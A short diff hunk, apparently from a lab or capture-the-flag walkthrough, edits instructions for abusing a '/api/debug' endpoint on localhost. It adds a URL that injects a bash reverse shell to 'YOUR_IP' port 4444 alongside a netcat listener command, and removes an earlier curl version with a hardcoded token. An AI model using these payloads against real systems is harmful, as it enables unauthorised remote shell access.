@@ -68,11 +68,10 @@ DEBUG_ENDPOINT = "/api/debug"
 ENV = "development"
 ```
 
-from that point we can use commands from a curl or directly from the url
+You can get a shell with the url http://localhost:5042/api/debug?cmd=bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261 2>%261
+after starting a netcat listener on your side
 ```
 nc -lvnp 4444
-curl http://localhost:5042/api/debug
- --data-urlencode "?cmd=bash -i >& /dev/tcp/192.168.56.1/4444 0>&1&token=h4l_d3bug_t0k3n_2024"
 ```
 
 ## Evaluate injection
